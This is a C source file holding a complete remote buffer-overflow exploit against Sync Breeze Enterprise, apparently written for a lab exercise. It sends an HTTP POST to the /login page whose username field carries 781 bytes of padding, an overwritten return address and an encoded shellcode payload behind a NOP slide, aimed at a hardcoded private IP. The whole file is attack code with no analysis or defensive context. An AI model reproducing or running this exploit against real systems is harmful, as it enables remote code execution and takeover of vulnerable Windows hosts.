/*
Sync Breeze Enterprise BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define DEFAULT_BUFLEN 512

#include <inttypes.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

DWORD SendRequest(char *request, int request_size) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    int iResult;

    printf("\n[>] Initialising Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("[!] Failed. Error Code : %d", WSAGetLastError());
        return 1;
    }

    printf("[>] Initialised.\n");
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("[!] Could not create socket : %d", WSAGetLastError());
    }

    printf("[>] Socket created.\n");
    server.sin_addr.s_addr = inet_addr("192.168.211.10");
    server.sin_family = AF_INET;
    server.sin_port = htons(80);

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        puts("[!] Connect error");
        return 1;
    }
    puts("[>] Connected");

    if (send(s, request, request_size, 0) < 0)
    {
        puts("[!] Send failed");
        return 1;
    }
    puts("\n[>] Request sent\n");
    closesocket(s);
    return 0;
}

void EvilRequest() {

    char request_one[] = "POST /login HTTP/1.1\r\n"
                        "Host: 192.168.211.10\r\n"
                        "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Accept-Language: en-US,en;q=0.5\r\n"
                        "Referer: http://192.168.211.10/login\r\n"
                        "Connection: close\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: ";
    char request_two[] = "\r\n\r\nusername=";

    int initial_buffer_size = 781;
    char *padding = malloc(initial_buffer_size);
    memset(padding, 0x41, initial_buffer_size);
    memset(padding + initial_buffer_size - 1, 0x00, 1);
    unsigned char retn[] = "\x83\x0c\x09\x10"; // "\xcb\x75\x52\x73"; //ret at msvbvm60.dll

    unsigned char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
    "\xb8\x83\xde\x5a\xeb\xd9\xe1\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
    "\x52\x31\x46\x12\x83\xc6\x04\x03\xc5\xd0\xb8\x1e\x35\x04\xbe"
    "\xe1\xc5\xd5\xdf\x68\x20\xe4\xdf\x0f\x21\x57\xd0\x44\x67\x54"
    "\x9b\x09\x93\xef\xe9\x85\x94\x58\x47\xf0\x9b\x59\xf4\xc0\xba"
    "\xd9\x07\x15\x1c\xe3\xc7\x68\x5d\x24\x35\x80\x0f\xfd\x31\x37"
    "\xbf\x8a\x0c\x84\x34\xc0\x81\x8c\xa9\x91\xa0\xbd\x7c\xa9\xfa"
    "\x1d\x7f\x7e\x77\x14\x67\x63\xb2\xee\x1c\x57\x48\xf1\xf4\xa9"
    "\xb1\x5e\x39\x06\x40\x9e\x7e\xa1\xbb\xd5\x76\xd1\x46\xee\x4d"
    "\xab\x9c\x7b\x55\x0b\x56\xdb\xb1\xad\xbb\xba\x32\xa1\x70\xc8"
    "\x1c\xa6\x87\x1d\x17\xd2\x0c\xa0\xf7\x52\x56\x87\xd3\x3f\x0c"
    "\xa6\x42\x9a\xe3\xd7\x94\x45\x5b\x72\xdf\x68\x88\x0f\x82\xe4"
    "\x7d\x22\x3c\xf5\xe9\x35\x4f\xc7\xb6\xed\xc7\x6b\x3e\x28\x10"
    "\x8b\x15\x8c\x8e\x72\x96\xed\x87\xb0\xc2\xbd\xbf\x11\x6b\x56"
    "\x3f\x9d\xbe\xf9\x6f\x31\x11\xba\xdf\xf1\xc1\x52\x35\xfe\x3e"
    "\x42\x36\xd4\x56\xe9\xcd\xbf\x98\x46\xba\xec\x71\x95\x44\x12"
    "\x39\x10\xa2\x7e\x2d\x75\x7d\x17\xd4\xdc\xf5\x86\x19\xcb\x70"
    "\x88\x92\xf8\x85\x47\x53\x74\x95\x30\x93\xc3\xc7\x97\xac\xf9"
    "\x6f\x7b\x3e\x66\x6f\xf2\x23\x31\x38\x53\x95\x48\xac\x49\x8c"
    "\xe2\xd2\x93\x48\xcc\x56\x48\xa9\xd3\x57\x1d\x95\xf7\x47\xdb"
    "\x16\xbc\x33\xb3\x40\x6a\xed\x75\x3b\xdc\x47\x2c\x90\xb6\x0f"
    "\xa9\xda\x08\x49\xb6\x36\xff\xb5\x07\xef\x46\xca\xa8\x67\x4f"
    "\xb3\xd4\x17\xb0\x6e\x5d\x37\x53\xba\xa8\xd0\xca\x2f\x11\xbd"
    "\xec\x9a\x56\xb8\x6e\x2e\x27\x3f\x6e\x5b\x22\x7b\x28\xb0\x5e"
    "\x14\xdd\xb6\xcd\x15\xf4";

    char request_three[] = "&password=A";

    int content_length = 9 + strlen(padding) + strlen(retn) + strlen(shellcode) + strlen(request_three);
    char *content_length_string = malloc(15);
    sprintf(content_length_string, "%d", content_length);
    int buffer_length = strlen(request_one) + strlen(content_length_string) + initial_buffer_size + strlen(retn) + strlen(request_two) + strlen(shellcode) + strlen(request_three);

    char *buffer = malloc(buffer_length);
    memset(buffer, 0x00, buffer_length);
    strcpy(buffer, request_one);
    strcat(buffer, content_length_string);
    strcat(buffer, request_two);
    strcat(buffer, padding);
    strcat(buffer, retn);
    strcat(buffer, shellcode);
    strcat(buffer, request_three);

    SendRequest(buffer, strlen(buffer));
}

int main() {

    EvilRequest();
    return 0;
}
